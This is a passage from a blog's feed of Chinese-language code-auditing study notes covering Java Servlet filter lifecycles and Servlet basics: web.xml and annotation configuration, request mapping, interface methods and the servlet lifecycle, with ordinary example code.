打开的资源，如关闭数据库等。</p><p>destroy() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x04-filter-的生命周期"><a href="#0x04-filter-的生命周期" class="headerlink" title="0x04 filter 的生命周期"></a>0x04 filter 的生命周期</h1><p>filter 的生命周期与 servlet 的生命周期比较类似，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111161127002.png"></p><p>当 Web 容器启动时，会根据 web.xml 中声明的 filter 顺序依次实例化这些 filter。</p><p>这里会根据实际情况的不同，doFilter() 方法可能会被调用多次，最后当程序关闭或者卸载时调用 destroy() 方法。</p><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/Soinice/article/details/82787964">https://blog.csdn.net/Soinice/article/details/82787964</a></p><p><a href="https://www.cnblogs.com/tanghaorong/p/12811457.html">https://www.cnblogs.com/tanghaorong/p/12811457.html</a></p><p><a href="https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912">https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;filter 被称为过滤器，是 Servlet 2.3 新增的一个特性，同时也是 Serlvet 技</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Java Web 核心技术-Servlet</title>
    <link href="https://www.teamssix.com/211115-165745.html"/>
    <id>https://www.teamssix.com/211115-165745.html</id>
    <published>2021-11-15T08:57:45.000Z</published>
    <updated>2021-11-22T08:59:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Servlet 是 Java Web 容器中运行的小程序，Servlet 原则上可以通过任何客户端-服务端协议进行通信，但它们常与 HTTP 一起使用，因此 Servlet 通常作为 “HTTP Servlet”的简写。</p><p>Servlet 是 Java EE 的核心，也是所有 MVC 框架实现的根本。</p><h1 id="0x01-Servlet-的配置"><a href="#0x01-Servlet-的配置" class="headerlink" title="0x01 Servlet 的配置"></a>0x01 Servlet 的配置</h1><p>版本不同，Servlet 的配置不同，Servlet 3.0 之前的版本都是在 web.xml 中配置的，在 3.0 之后的版本中则使用更为方便的注解方法来配置。</p><p>此外不同版本的 Servlet 所需要的 Java/JDK 版本也不同，具体如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151655826.png"></p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的 Servlet 配置文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 web.xml 中，Servlet 的配置在 Servlet 标签中，Servlet 标签由 Servlet 和 Servlet-mapping 标签组成，两者通过标签中相同的 Servlet-name 实现关联，上述配置文件中的标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;声明 Servlet 配置入口&lt;description&gt;声明 Servlet 描述信息&lt;display-name&gt;定义 Web 应用的名称&lt;servlet-name&gt;声明 Servlet 名称以便在后面的映射时使用&lt;servlet-class&gt;指定当前 Servlet 对应的类的路径&lt;servlet-mapping&gt;注册组件访问配置的路径入口&lt;servlet-name&gt;指定上文配置的 Servlet 名称&lt;url-pattern&gt;指定配置这个组件的访问路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解方式"><a href="#2、基于注解方式" class="headerlink" title="2、基于注解方式"></a>2、基于注解方式</h2><p>Servlet 3.0 以上的版本中，开发者无须在 web.xml 里配置 Servlet，只需要添加 @WebServlet 注解即可修改 Servlet 的属性，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token comment">/** * 基于注解开发Servlet */</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/ann.do"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AnnotationServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doPost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;HEAD>&lt;TITLE> ITBZ &lt;/TITLE>&lt;/HEAD>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Annotation Servlet!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/BODY>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/HTML>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注解参数</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656906.png"></p><p>通过图中的「等价于 web.xml 的标签」一栏可以看出，web.xml 可以配置的 Servlet 属性都可以通过 @WebServlet 的方式进行配置。</p><h1 id="0x02-Servlet-的访问流程"><a href="#0x02-Servlet-的访问流程" class="headerlink" title="0x02 Servlet 的访问流程"></a>0x02 Servlet 的访问流程</h1><p>以上文中的 web.xml 配置文件为例，其访问流程如下所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656655.png"></p><p>首先用户在浏览器里输入URL，然后浏览器发起请求，服务器通过 servlet-mapping 标签找到文件名为 user 的 url-pattern，通过其对应的 servlet-name 寻找 servlet 标签中 servlet-name 相同的 servlet，再获取其 servlet 标签里的 servlet-class 参数，最后得到具体的 class 文件路径，从而执行相关文件。</p><h1 id="0x03-Servlet-的接口方法"><a href="#0x03-Servlet-的接口方法" class="headerlink" title="0x03 Servlet 的接口方法"></a>0x03 Servlet 的接口方法</h1><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>在 Servlet 实例化后，Servlet 容器会调用 init() 方法来初始化该对象，主要是为了让 Servlet 对象在处理客户请求前可以完成一些初始化的工作，例如建立数据库连接，获取配置信息等。</p><p>对于每一个 Servlet 实例，init() 方法只能被调用一次。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、service-接口"><a href="#2、service-接口" class="headerlink" title="2、service() 接口"></a>2、service() 接口</h2><p>service() 方法是执行实际任务的主要方法，Servlet 容器调用 service() 方法来处理来自客户端（浏览器）的请求，并将格式化的响应写回客户端，每次服务器接收到一个 Servlet 请求时，服务器都会产生一个新的线程并调用服务。</p><p>值得注意的是，在 service() 方法被容器调用之前，必须确保 init() 方法正确完成。</p><p>service() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> service <span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">ServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>     <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3、doGet-doPost-等接口"><a href="#3、doGet-doPost-等接口" class="headerlink" title="3、doGet() / doPost() 等接口"></a>3、doGet() / doPost() 等接口</h2><p>doGet() 等方法需要根据 HTTP 的不同请求调用不同的方法，如果 HTTP 得到一个来自 URL 的 GET 请求，就会调用 doGet() 方法，同样的，如果得到 POST 请求，就会调用 doPost() 方法。</p><p>这类方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span>    <span class="token comment">// 如果是 POST 请求，则调用 public void doPost 方法</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、destroy-接口"><a href="#4、destroy-接口" class="headerlink" title="4、destroy() 接口"></a>4、destroy() 接口</h2><p>当容器检测到一个 Servlet 对象应该从服务中被移除的时候，容器会调用该对象的 destroy() 方法，以便让 Servlet 对象可以释放它所使用的资源，保存数据到持久存储设备中，例如将内存中的数据保存到数据库中，关闭数据库的连接等。</p><p>destroy() 方法与 init() 方法相同，都只会调用一次。</p><p>destroy() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 开发者自定义代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5、getServletConfig-接口"><a href="#5、getServletConfig-接口" class="headerlink" title="5、getServletConfig() 接口"></a>5、getServletConfig() 接口</h2><p>该方法返回容器调用 init() 方法时传递给 Servlet 对象的 ServletConfig 对象，ServletConfig 对象包含了 Servlet 的初始化参数。</p><h2 id="6、getServletInfo-接口"><a href="#6、getServletInfo-接口" class="headerlink" title="6、getServletInfo() 接口"></a>6、getServletInfo() 接口</h2><p>该方法返回一个 String 类型的字符串，其中包括了关于 Servlet 的信息，例如，作者、版本和版权等。</p><h1 id="0x04-Servlet-的生命周期"><a href="#0x04-Servlet-的生命周期" class="headerlink" title="0x04 Servlet 的生命周期"></a>0x04 Servlet 的生命周期</h1><p>Servlet 生命周期指的是 Servlet 从创建直到销毁的整个过程。</p><p>在一个生命周期中，Servlet 经历了被加载、初始化、接收请求、响应请求以及提供服务的过程，具体如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151656032.png"></p><blockquote><p>参考链接：</p><p><a href="https://tomcat.apache.org/whichversion.html">https://tomcat.apache.org/whichversion.html</a></p><p><a href="https://blog.csdn.net/bieleyang/article/details/76696131">https://blog.csdn.net/bieleyang/article/details/76696131</a></p><p><a href="https://blog.csdn.net/qq_45017999/article/details/106696148">https://blog.csdn.net/qq_45017999/article/details/106696148</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Servlet 是 Java Web 容器中运行的小程序，Servlet 原则上可以通过任何客户端-</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
